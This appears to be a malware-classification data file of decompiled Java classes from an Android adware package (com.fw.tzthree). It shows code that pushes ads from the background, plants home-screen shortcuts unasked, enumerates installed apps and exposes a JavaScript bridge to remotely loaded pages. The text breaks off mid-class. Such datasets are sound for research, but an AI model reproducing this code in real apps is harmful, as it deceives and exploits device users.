"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FwBannerManager.code","public class FwBannerManager {   public static void init(  Context context){     BannerBusiness.a().init(context);   }   public static void init(  Context context,  String str){     BannerBusiness.a().init(context,str);   }   public static void loadBannerAD(  Context context,  ViewGroup viewGroup){     com.fw.tzthree.c.b.a.a().a(new q(context,new Handler(),viewGroup));   }   public static void loadBannerAD(  Context context,  ViewGroup viewGroup,  FwBannerListener fwBannerListener){     com.fw.tzthree.c.b.a.a().a(new r(context,new Handler(),viewGroup,fwBannerListener));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FwBoxManager.code","public class FwBoxManager {   public static void createShortcut(  Context context,  String str,  long j,  boolean z){     t.a().a(context,str,j);     if (z) {       com.fw.tzthree.d.z.a(context,com.fw.tzthree.b.a.bp,com.fw.tzthree.b.a.bt,com.fw.tzthree.b.a.bo,com.fw.tzthree.b.a.bC);     }  else {       com.fw.tzthree.d.z.a(context,com.fw.tzthree.b.a.bp,com.fw.tzthree.b.a.bt,com.fw.tzthree.b.a.bo,"""");     }   }   public static void init(  Context context){     BoxBusiness.b().init(context);   }   public static void init(  Context context,  String str){     BoxBusiness.b().init(context,str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FwCustomClickResponse.code","public interface FwCustomClickResponse {   void clickResponse(  FwDiyAdInfo fwDiyAdInfo,  CustomRelativelayout$Holder customRelativelayout$Holder); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FwCustomManager.code","public class FwCustomManager {   public static void getAdList(  Context context,  FwCustomRequestListener fwCustomRequestListener){     CustomBusiness.getInstence().getAdList(context,fwCustomRequestListener);   }   public static void init(  Context context){     CustomBusiness.getInstence().init(context);   }   public static void init(  Context context,  String str){     CustomBusiness.getInstence().init(context,str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FwCustomRelativelayout.code","public class FwCustomRelativelayout extends RelativeLayout implements View.OnClickListener {   private FwCustomClickResponse a;   private FwDiyAdInfo b;   private boolean c;   public FwCustomRelativelayout(  Context context){     super(context);     setOnClickListener(this);   }   public FwCustomRelativelayout(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     setOnClickListener(this);   }   public FwCustomRelativelayout(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);     setOnClickListener(this);   }   public CustomAdInfo a(  FwDiyAdInfo fwDiyAdInfo){     com.fw.tzthree.db.a aVar=new com.fw.tzthree.db.a();     aVar.c(getContext());     return (CustomAdInfo)aVar.a(7,fwDiyAdInfo.getAppId(),1);   }   private void a(){     a(4);   }   private void a(  int i){     CustomAdInfo a;     FwDiyAdInfo c=c();     if (c == null || (a=a(c)) == null) {       return;     }     CustomBusiness.getInstence().postActionRequest(getContext(),a,Integer.valueOf(i));   }   public void a(  CustomAdInfo customAdInfo){     Intent intent=new Intent(getContext(),(Class<?>)FwWebActivity.class);     intent.putExtra(com.fw.tzthree.b.a.aX,customAdInfo);     intent.putExtra(com.fw.tzthree.b.a.ba,6);     intent.setFlags(268435456);     getContext().startActivity(intent);   }   private void b(){     a(3);   }   public void b(  CustomAdInfo customAdInfo){     com.fw.tzthree.d.m.a(getContext(),customAdInfo,7,1,false);   }   public FwDiyAdInfo c(){     return this.b;   }   private FwCustomClickResponse d(){     return this.a;   }   @Override protected void onAttachedToWindow(){     super.onAttachedToWindow();     this.c=true;     b();   }   @Override public void onClick(  View view){     a();     if (c() != null) {       if (d() != null) {         d().clickResponse(c(),new CustomRelativelayout$Holder(this,c()));       }  else {         if (TextUtils.isEmpty(c().getIconUrl())) {           return;         }         new CustomRelativelayout$Holder(this,c()).executeNext();       }     }   }   @Override protected void onDetachedFromWindow(){     super.onDetachedFromWindow();   }   public void setCustomClickResponse(  FwCustomClickResponse fwCustomClickResponse){     this.a=fwCustomClickResponse;   }   public void setDiyAdInfo(  FwDiyAdInfo fwDiyAdInfo){     this.b=fwDiyAdInfo;     if (this.c) {       b();     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FwCustomRequestListener.code","public interface FwCustomRequestListener {   void onResponse(  List<FwDiyAdInfo> list,  boolean z); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FwDiyAdInfo.code","public class FwDiyAdInfo {   private Integer a;   private String b;   private String c;   private String d;   private String e;   private Integer f;   private String g;   private String h;   private List<Material> i;   public Integer getAppId(){     return this.a;   }   public Integer getAppKind(){     return this.f;   }   public String getAppName(){     return this.b;   }   public String getAppSize(){     return this.c;   }   public String getAppText(){     return this.d;   }   public String getAppVersion(){     return this.e;   }   public String getDescription(){     return this.g;   }   public String getIconUrl(){     return this.h;   }   public List<Material> getMaterialList(){     return this.i;   }   public void setAppId(  Integer num){     this.a=num;   }   public void setAppKind(  Integer num){     this.f=num;   }   public void setAppName(  String str){     this.b=str;   }   public void setAppSize(  String str){     this.c=str;   }   public void setAppText(  String str){     this.d=str;   }   public void setAppVersion(  String str){     this.e=str;   }   public void setDescription(  String str){     this.g=str;   }   public void setIconUrl(  String str){     this.h=str;   }   public void setMaterialList(  List<Material> list){     this.i=list;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FwFSManager.code","public class FwFSManager {   public static final int BUTTON_STYLE=289;   public static final int COUNTDOWN_STYLE=288;   public static void init(  Context context){     FullScreenBusiness.a().init(context);   }   public static void init(  Context context,  String str){     FullScreenBusiness.a().init(context,str);   }   public static void loadAdSplashStyle(  Activity activity,  int i,  FwSplashAdListener fwSplashAdListener,  long j){     FullScreenBusiness.a().a(activity,fwSplashAdListener,i,j);   }   public static void showFullScreenAd(  Context context,  int i){     FullScreenBusiness.a().a(context,(FullScreenCallBack)null,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FwInterstitialListener.code","public interface FwInterstitialListener extends CallbackListener { } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FwInterstitialManager.code","public class FwInterstitialManager {   private static Context a;   public static void init(  Context context){     InterstitialBusiness.a().init(context);   }   public static void init(  Context context,  String str){     InterstitialBusiness.a().init(context,str);   }   public static void show(  Context context){     a=context;     com.fw.tzthree.c.b.a.a().a(new aw(new Handler()));   }   public static void show(  Context context,  FwInterstitialListener fwInterstitialListener){     a=context;     com.fw.tzthree.c.b.a.a().a(new ax(new Handler(),fwInterstitialListener));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\FwSplashAdListener.code","public interface FwSplashAdListener {   void onSplashDismiss();   void onSplashLoadFailed();   void onSplashPresent(); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\g.code","public interface g {   void a(); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\h.code","public class h implements ViewPager.OnPageChangeListener {   final AdView a;   private List<TableplaqueAdInfo> b;   private TableplaqueAdInfo c;   private LinearLayout d;   private Context e;   private List<View> f;   public h(  AdView adView,  List<TableplaqueAdInfo> list,  LinearLayout linearLayout,  Context context,  List<View> list2){     this.a=adView;     this.b=list;     this.e=context;     this.d=linearLayout;     this.f=list2;   }   @Override public void onPageScrollStateChanged(  int i){   }   @Override public void onPageScrolled(  int i,  float f,  int i2){   }   @Override public void onPageSelected(  int i){     AutoScrollViewPager autoScrollViewPager;     AutoScrollViewPager autoScrollViewPager2;     this.a.b=i;     if (this.b == null || this.b.size() == 0) {       return;     }     this.c=this.b.get(i);     View view=this.f.get(i);     view.setClickable(true);     this.d.setClickable(true);     this.a.c=this.c.getShowTime().intValue() * 1000;     autoScrollViewPager=this.a.h;     autoScrollViewPager.a(this.a.c);     autoScrollViewPager2=this.a.h;     autoScrollViewPager2.setInterval(this.a.c);     if (this.c.getWifiSwitches() != null && com.fw.tzthree.d.aa.a(this.e,this.c).getFullscreenDown().isOn()) {       this.d.setOnClickListener(new i(this,view));     }     InterstitialBusiness.a().postActionRequest(this.e,this.c,3);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\i.code","class i implements View.OnClickListener {   final View a;   final h b;   public i(  h hVar,  View view){     this.b=hVar;     this.a=view;   }   @Override public void onClick(  View view){     LinearLayout linearLayout;     linearLayout=this.b.d;     linearLayout.setClickable(false);     this.a.performClick();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\InterstitialBusiness.code","public class InterstitialBusiness extends y<TableplaqueAdInfo> {   private static InterstitialBusiness a;   public static synchronized InterstitialBusiness a(){     InterstitialBusiness interstitialBusiness; synchronized (InterstitialBusiness.class) {       if (a == null) {         a=new InterstitialBusiness();       }       interstitialBusiness=a;     }     return interstitialBusiness;   }   private AdNode<TableplaqueAdInfo> a(  int i){     AdNode<TableplaqueAdInfo> adNode=new AdNode<>();     adNode.setAdType(Integer.valueOf(getAdType()));     adNode.setShowStyle(Integer.valueOf(i));     return adNode;   }   public void a(  Context context,  Handler handler,  FwInterstitialListener fwInterstitialListener){     requestAdList(context,a(1),handler,fwInterstitialListener);   }   @Override protected void a(  com.fw.tzthree.d.f fVar){     fVar.d(com.fw.tzthree.b.a.o);   }   @Override void a(  BusinessDataContext<TableplaqueAdInfo> businessDataContext){   }   @Override void a(  BusinessDataContext<TableplaqueAdInfo> businessDataContext,  List<TableplaqueAdInfo> list){     if ((businessDataContext.getContext() instanceof Activity) && !((Activity)businessDataContext.getContext()).isFinishing()) {       new a((Activity)businessDataContext.getContext(),0).a(businessDataContext.getContext(),list);       return;     }     try {       Class<?> a2=ay.a(businessDataContext.getContext());       if (a2 != null) {         Intent intent=new Intent(businessDataContext.getContext(),a2);         intent.addFlags(268435456);         av avVar=new av();         avVar.a(list);         intent.putExtra(com.fw.tzthree.b.a.aX,avVar);         businessDataContext.getContext().startActivity(intent);       }     }  catch (    Exception e) {     }   }   @Override public com.fw.tzthree.c.d addFilterPipelineNode(  com.fw.tzthree.c.d dVar,  BusinessDataContext businessDataContext){     if (1 == businessDataContext.getRequestData().getAd().getShowStyle().intValue()) {       dVar.a(new com.fw.tzthree.c.a.x());     }  else {       dVar.a(new com.fw.tzthree.c.a.p());     }     return dVar;   }   @Override public int getAdType(){     return 3;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\j.code","public class j implements View.OnClickListener {   final AutoScrollViewPager a;   final RelativeLayout b;   final RelativeLayout c;   final Context d;   final BannerAdInfo e;   final BannerBusiness f;   public j(  BannerBusiness bannerBusiness,  AutoScrollViewPager autoScrollViewPager,  RelativeLayout relativeLayout,  RelativeLayout relativeLayout2,  Context context,  BannerAdInfo bannerAdInfo){     this.f=bannerBusiness;     this.a=autoScrollViewPager;     this.b=relativeLayout;     this.c=relativeLayout2;     this.d=context;     this.e=bannerAdInfo;   }   @Override public void onClick(  View view){     this.a.a();     this.b.removeView(this.c);     this.f.a(this.d,this.e);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\k.code","class k implements View.OnClickListener {   final AutoScrollViewPager a;   final RelativeLayout b;   final RelativeLayout c;   final Context d;   final BannerAdInfo e;   final BannerBusiness f;   public k(  BannerBusiness bannerBusiness,  AutoScrollViewPager autoScrollViewPager,  RelativeLayout relativeLayout,  RelativeLayout relativeLayout2,  Context context,  BannerAdInfo bannerAdInfo){     this.f=bannerBusiness;     this.a=autoScrollViewPager;     this.b=relativeLayout;     this.c=relativeLayout2;     this.d=context;     this.e=bannerAdInfo;   }   @Override public void onClick(  View view){     this.a.a();     this.b.removeView(this.c);     this.f.postActionRequest(this.d,this.e,4);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\l.code","class l implements com.fw.tzthree.d.q {   final boolean a;   final BusinessDataContext b;   final List c;   final float d;   final String e;   final BannerBusiness f;   public l(  BannerBusiness bannerBusiness,  boolean z,  BusinessDataContext businessDataContext,  List list,  float f,  String str){     this.f=bannerBusiness;     this.a=z;     this.b=businessDataContext;     this.c=list;     this.d=f;     this.e=str;   }   @Override public void a(  Bitmap bitmap){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     Matrix matrix=new Matrix();     if (this.a) {       float f=this.f.g / width;       matrix.postScale(f,f);     }  else {       float f2=this.f.h / height;       matrix.postScale(f2,f2);     }     Bitmap createBitmap=Bitmap.createBitmap(bitmap,0,0,width,height,matrix,true);     int width2=createBitmap.getWidth();     int height2=createBitmap.getHeight();     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(width2,height2);     this.f.a.setLayoutParams(layoutParams);     MyRelativeLayout myRelativeLayout=new MyRelativeLayout(this.b.getContext());     myRelativeLayout.setLayoutParams(layoutParams);     myRelativeLayout.setAutoScrollViewPager(this.f.a);     myRelativeLayout.setLayoutParams(layoutParams);     myRelativeLayout.addView(this.f.a);     ArrayList arrayList=new ArrayList();     int size=this.c.size();     for (int i=0; i < size; i++) {       BannerAdInfo bannerAdInfo=(BannerAdInfo)this.c.get(i);       if (4 == bannerAdInfo.getKind().intValue()) {         ProgressWebView progressWebView=new ProgressWebView(this.b.getContext());         progressWebView.setLayoutParams(layoutParams);         progressWebView.addJavascriptInterface(new JsInterface(this.b.getContext(),bannerAdInfo,BannerBusiness.a()),com.fw.tzthree.b.a.O);         progressWebView.loadUrl(bannerAdInfo.getUrl() + ""?w="" + (width2 / this.d)+ ""&h=""+ (height2 / this.d));         arrayList.add(progressWebView);       }  else {         SmartImageView smartImageView=new SmartImageView(this.b.getContext());         smartImageView.setLayoutParams(layoutParams);         smartImageView.setAdjustViewBounds(true);         smartImageView.setScaleType(ImageView.ScaleType.FIT_XY);         com.fw.tzthree.d.n.a(this.b.getContext(),this.f.c + com.fw.tzthree.d.n.a(com.fw.tzthree.d.l.b(this.b.getContext()),bannerAdInfo.getBannerImg())[1],new m(this,smartImageView));         smartImageView.setOnClickListener(new n(this,smartImageView,bannerAdInfo,layoutParams,myRelativeLayout));         arrayList.add(smartImageView);       }     }     this.f.b=new com.fw.tzthree.a.a(arrayList);     this.f.a.setAdapter(this.f.b);     this.f.a.setOnPageChangeListener(new o(this.f,this.b.getContext(),this.c,this.e));     BannerAdInfo bannerAdInfo2=(BannerAdInfo)this.c.get(0);     if (bannerAdInfo2 != null && bannerAdInfo2.getShowTime() != null) {       this.f.f=bannerAdInfo2.getShowTime().intValue() * 1000;     }     this.f.a.setCycle(true);     this.f.a.a(this.f.f);     this.f.a.setInterval(this.f.f);     Context context=this.b.getContext();     String str=com.fw.tzthree.b.a.h;     this.b.getContext();     this.f.e=context.getSharedPreferences(str,0).getInt(com.fw.tzthree.b.a.i,100);     if (this.f.e + 1 == this.c.size()) {       this.f.e=0;     }  else     if (this.f.e == 100) {       this.f.e=0;     }  else {       this.f.e++;     }     this.f.a.setCurrentItem(this.f.e);     Context context2=this.b.getContext();     String str2=com.fw.tzthree.b.a.h;     this.b.getContext();     context2.getSharedPreferences(str2,0).edit().putInt(com.fw.tzthree.b.a.i,this.f.e).commit();     this.f.d.removeAllViews();     this.f.d.addView(myRelativeLayout);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\m.code","class m implements com.fw.tzthree.d.q {   final SmartImageView a;   final l b;   public m(  l lVar,  SmartImageView smartImageView){     this.b=lVar;     this.a=smartImageView;   }   @Override public void a(  Bitmap bitmap){     int width=bitmap.getWidth();     int height=bitmap.getHeight();     Matrix matrix=new Matrix();     if (this.b.a) {       float f=this.b.f.g / width;       matrix.postScale(f,f);     }  else {       float f2=this.b.f.h / height;       matrix.postScale(f2,f2);     }     this.a.setImageBitmap(Bitmap.createBitmap(bitmap,0,0,width,height,matrix,true));   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\Material.code","public class Material {   private Integer a;   private Integer b;   private String c;   public Material(){   }   public Material(  Integer num,  Integer num2,  String str){     this.a=num;     this.b=num2;     this.c=str;   }   public Integer getHeight(){     return this.a;   }   public String getImageUrl(){     return this.c;   }   public Integer getWidth(){     return this.b;   }   public void setHeight(  Integer num){     this.a=num;   }   public void setImageUrl(  String str){     this.c=str;   }   public void setWidth(  Integer num){     this.b=num;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\n.code","class n implements View.OnClickListener {   final SmartImageView a;   final BannerAdInfo b;   final RelativeLayout.LayoutParams c;   final MyRelativeLayout d;   final l e;   public n(  l lVar,  SmartImageView smartImageView,  BannerAdInfo bannerAdInfo,  RelativeLayout.LayoutParams layoutParams,  MyRelativeLayout myRelativeLayout){     this.e=lVar;     this.a=smartImageView;     this.b=bannerAdInfo;     this.c=layoutParams;     this.d=myRelativeLayout;   }   @Override public void onClick(  View view){     RelativeLayout a;     this.a.setClickable(false);     if (this.b.getKind().intValue() == 1) {       Intent intent=new Intent(this.e.b.getContext(),(Class<?>)FwWebActivity.class);       intent.putExtra(com.fw.tzthree.b.a.aX,this.b);       intent.putExtra(com.fw.tzthree.b.a.ba,this.e.f.getAdType());       intent.addFlags(268435456);       this.e.b.getContext().startActivity(intent);       this.e.f.postActionRequest(this.e.b.getContext(),this.b,4);       return;     }     if (this.b.getKind().intValue() != 2) {       if (3 == this.b.getKind().intValue()) {         com.fw.tzthree.d.r.a(this.e.b.getContext(),this.b.getUrl());         this.e.f.postActionRequest(this.e.b.getContext(),this.b,4);         return;       }       return;     }     if (this.b.getWifiSwitches() == null || !com.fw.tzthree.d.aa.a(this.e.b.getContext(),this.b).getClickDown().isOff()) {       this.e.f.a(this.e.b.getContext(),this.b);       return;     }     a=this.e.f.a(this.e.b.getContext(),this.e.f.a,this.c,this.d,this.b);     this.d.removeView(a);     this.d.addView(a);     this.e.f.a.b();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\o.code","class o implements ViewPager.OnPageChangeListener {   long a=com.fw.tzthree.d.ab.a();   final BannerBusiness b;   private List<BannerAdInfo> c;   private BannerAdInfo d;   private Context e;   public o(  BannerBusiness bannerBusiness,  Context context,  List<BannerAdInfo> list,  String str){     this.b=bannerBusiness;     this.c=list;     this.e=context;   }   @Override public void onPageScrollStateChanged(  int i){   }   @Override public void onPageScrolled(  int i,  float f,  int i2){   }   @Override public void onPageSelected(  int i){     Long l;     Long l2;     Long l3;     if (this.c != null && this.c.size() != 0) {       this.d=this.c.get(i);       this.b.f=this.d.getShowTime().intValue() * 1000;       this.b.a.a(this.b.f);       this.b.a.setInterval(this.b.f);       this.b.postActionRequest(this.e,this.d,3);     }     this.e.getSharedPreferences(com.fw.tzthree.b.a.h,0).edit().putInt(com.fw.tzthree.b.a.i,i).commit();     long a=com.fw.tzthree.d.ab.a() - this.a;     l=this.b.l;     if (a >= l.longValue()) {       BannerBusiness bannerBusiness=this.b;       l2=this.b.l;       long longValue=l2.longValue();       l3=this.b.l;       bannerBusiness.l=Long.valueOf(longValue + l3.longValue());       com.fw.tzthree.c.b.a.a().a(new p(this,new Handler()));     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\p.code","class p implements Runnable {   final Handler a;   final o b;   public p(  o oVar,  Handler handler){     this.b=oVar;     this.a=handler;   }   @Override public void run(){     Context context;     BannerBusiness bannerBusiness=this.b.b;     context=this.b.e;     bannerBusiness.requestAdList(context,this.a,null);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\q.code","final class q implements Runnable {   final Context a;   final Handler b;   final ViewGroup c;   public q(  Context context,  Handler handler,  ViewGroup viewGroup){     this.a=context;     this.b=handler;     this.c=viewGroup;   }   @Override public void run(){     BannerBusiness.a().a(this.a,this.b,this.c,null);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\r.code","final class r implements Runnable {   final Context a;   final Handler b;   final ViewGroup c;   final FwBannerListener d;   public r(  Context context,  Handler handler,  ViewGroup viewGroup,  FwBannerListener fwBannerListener){     this.a=context;     this.b=handler;     this.c=viewGroup;     this.d=fwBannerListener;   }   @Override public void run(){     BannerBusiness.a().a(this.a,this.b,this.c,this.d);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\s.code","public class s implements Runnable {   final Context a;   final Handler b;   final BoxBusiness c;   public s(  BoxBusiness boxBusiness,  Context context,  Handler handler){     this.c=boxBusiness;     this.a=context;     this.b=handler;   }   @Override public void run(){     AdNode adNode=new AdNode();     adNode.setAdType(Integer.valueOf(BoxBusiness.b().getAdType()));     adNode.setCategory(2);     BoxBusiness.b().requestAdList(this.a,adNode,this.b,null);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\t.code","public class t {   private static t a;   private static final Handler b=new Handler();   private t(){   }   public Bitmap a(  Context context,  List<Bitmap> list){     float dimension=context.getResources().getDimension(R.dimen.app_icon_size) / 80.0f;     Bitmap b2=com.fw.tzthree.d.a.b(context,com.fw.tzthree.b.a.by);     int width=b2.getWidth();     int height=b2.getHeight();     Bitmap createBitmap=Bitmap.createBitmap(width,height,Bitmap.Config.ARGB_8888);     Canvas canvas=new Canvas(createBitmap);     canvas.drawBitmap(b2,0.0f,0.0f,(Paint)null);     Matrix matrix=new Matrix();     float f=((width - 12) / 2) - 4;     float f2=f / width;     matrix.postScale(f2,f2);     for (int i=0; i < 4; i++) {       try {         if (i < list.size()) {           Bitmap bitmap=list.get(i);           canvas.drawBitmap(Bitmap.createBitmap(bitmap,0,0,width,height,matrix,true),((((i % 2) * 2) + 1) * 2) + 6 + ((i % 2) * f),((((i / 2) * 2) + 1) * 2) + 6 + ((i / 2) * f),(Paint)null);           bitmap.recycle();         }       }  catch (      Exception e) {         e.printStackTrace();         return null;       }     }     Bitmap createScaledBitmap=Bitmap.createScaledBitmap(createBitmap,(int)(createBitmap.getWidth() * dimension),(int)(createBitmap.getHeight() * dimension),true);     createBitmap.recycle();     return createScaledBitmap;   }   public static t a(){     if (a == null) { synchronized (t.class) {         if (a == null) {           a=new t();         }       }     }     return a;   }   private void a(  Context context,  String str){     com.fw.tzthree.d.z.a(context,com.fw.tzthree.b.a.bp,com.fw.tzthree.b.a.bs,com.fw.tzthree.b.a.bo,str);   }   public boolean a(  Context context,  String str,  String str2,  String str3){     Cursor query=context.getContentResolver().query(b() < 8 ? Uri.parse(""content://"" + str + ""/favorites?notify=true"") : Uri.parse(""content://"" + str + ""/favorites?notify=true""),null,com.fw.tzthree.b.a.bx,new String[]{str2,str3},null);     boolean z=query != null && query.getCount() > 0;     if (query != null) {       query.close();     }     return z;   }   private int b(){     return Build.VERSION.SDK_INT;   }   public String b(  Context context,  String str){     int i;     if (str == null) {       return null;     }     List<PackageInfo> installedPackages=context.getPackageManager().getInstalledPackages(8);     if (installedPackages != null) {       Iterator<PackageInfo> it=installedPackages.iterator();       while (it.hasNext()) {         ProviderInfo[] providerInfoArr=it.next().providers;         if (providerInfoArr != null) {           int length=providerInfoArr.length;           while (i < length) {             ProviderInfo providerInfo=providerInfoArr[i];             i=(str.equals(providerInfo.readPermission) || str.equals(providerInfo.writePermission)) ? 0 : i + 1;             return providerInfo.authority;           }         }       }     }     return null;   }   private void b(  Context context,  long j){     com.fw.tzthree.d.z.a(context,com.fw.tzthree.b.a.bp,com.fw.tzthree.b.a.br,com.fw.tzthree.b.a.bo,"""" + j);   }   public void c(  Context context){     if (com.fw.tzthree.d.e.b(context) != 0) {       new Timer().schedule(new w(this,new Handler(),context),10000L);     }   }   private boolean d(  Context context){     long a2=com.fw.tzthree.d.ab.a();     return !com.fw.tzthree.d.ab.a(a2,a(context)) && (a2 - e(context) >= 0 || e(context) == 0);   }   private long e(  Context context){     String b2=com.fw.tzthree.d.z.b(context,com.fw.tzthree.b.a.bp,com.fw.tzthree.b.a.br,com.fw.tzthree.b.a.bo,""0"");     if (TextUtils.isEmpty(b2)) {       return 0L;     }     return Long.parseLong(b2);   }   protected long a(  Context context){     String b2=com.fw.tzthree.d.z.b(context,com.fw.tzthree.b.a.bp,com.fw.tzthree.b.a.bq,com.fw.tzthree.b.a.bo,""0"");     if (TextUtils.isEmpty(b2)) {       return 0L;     }     return Long.parseLong(b2);   }   protected void a(  Context context,  long j){     com.fw.tzthree.d.z.a(context,com.fw.tzthree.b.a.bp,com.fw.tzthree.b.a.bq,com.fw.tzthree.b.a.bo,"""" + j);   }   public synchronized void a(  Context context,  Bitmap bitmap){     if (!TextUtils.isEmpty(b(context,com.fw.tzthree.b.a.bu)) && !a(context,b(context,com.fw.tzthree.b.a.bu),b(context),context.getPackageName())) {       Intent intent=new Intent(""android.intent.action.MAIN"");       intent.setClass(context,FwBoxDActivity.class);       Intent intent2=new Intent(com.fw.tzthree.b.a.bv);       intent2.putExtra(com.fw.tzthree.b.a.bw,false);       intent2.putExtra(""android.intent.extra.shortcut.INTENT"",intent);       intent2.putExtra(""android.intent.extra.shortcut.NAME"",b(context));       intent2.putExtra(""android.intent.extra.shortcut.ICON"",bitmap);       context.sendBroadcast(intent2);       a(context,com.fw.tzthree.d.ab.a());     }   }   public void a(  Context context,  String str,  long j){     if (e(context) == 0) {       if (j < 0) {         j=0;       }       b(context,com.fw.tzthree.d.ab.a() + (j * 1000));     }     if (TextUtils.isEmpty(b(context))) {       a(context,str);     }     new Timer().schedule(new u(this,new Handler(),context),(j * 1000) + 20);   }   public void a(  Handler handler,  Context context){     if (d(context)) {       BoxBusiness.b().a(context,handler,new v(this,context),false);     }   }   public String b(  Context context){     return com.fw.tzthree.d.z.b(context,com.fw.tzthree.b.a.bp,com.fw.tzthree.b.a.bs,com.fw.tzthree.b.a.bo,"""");   }   public void b(  Handler handler,  Context context){     a(b,context);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\u.code","class u extends TimerTask {   final Handler a;   final Context b;   final t c;   public u(  t tVar,  Handler handler,  Context context){     this.c=tVar;     this.a=handler;     this.b=context;   }   @Override public void run(){     this.c.a(this.a,this.b);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.core\v.code","public class v implements x {   final Context a;   final t b;   public v(  t tVar,  Context context){     this.b=tVar;     this.a=context;   }   @Override public void a(  BusinessDataContext<AppWallAdInfo> businessDataContext){     this.b.c(this.a);   }   @Override public void a(  BusinessDataContext<AppWallAdInfo> businessDataContext,  List<AppWallAdInfo> list){     String b;     String b2;     boolean a;     Bitmap a2;     Bitmap a3;     b=this.b.b(this.a,com.fw.tzthree.b.a.bu);     if (TextUtils.isEmpty(b)) {       return;     }     t tVar=this.b;     Context context=this.a;     b2=this.b.b(this.a,com.fw.tzthree.b.a.bu);     a=tVar.a(context,b2,this.b.b(this.a),this.a.getPackageName());     if (a) {       return;     }     ArrayList arrayList=new ArrayList();     Setting setting=BoxBusiness.b().getSetting(this.a,BoxBusiness.b().getAdType());     int i=0;     while (true) {       int i2=i;       if (i2 >= list.size()) {         break;       }       Bitmap bitmap=new WebImageCache(this.a).get(setting.getResourcesAddr() + list.get(i2).getIcon());       if (bitmap != null) {         arrayList.add(com.fw.tzthree.d.n.b(bitmap,80,80));       }  else {         com.fw.tzthree.d.n.a(this.a,setting.getResourcesAddr() + list.get(i2).getIcon(),(com.fw.tzthree.d.q)null);       }       if (arrayList.size() >= 4) {         break;       }  else {         i=i2 + 1;       }     }     if (arrayList.size() == 0) {       this.b.c(this.a);       return;     }     if (list.size() >= 4) {       if (arrayList.size() < 4) {         this.b.c(this.a);         return;       }       t tVar2=this.b;       Context context2=this.a;       a3=this.b.a(this.a,(List<Bitmap>)arrayList);       tVar2.a(context2,a3);       return;     }     if (arrayList.size() != list.size()) {       this.b.c(this.a);       return;     }     t 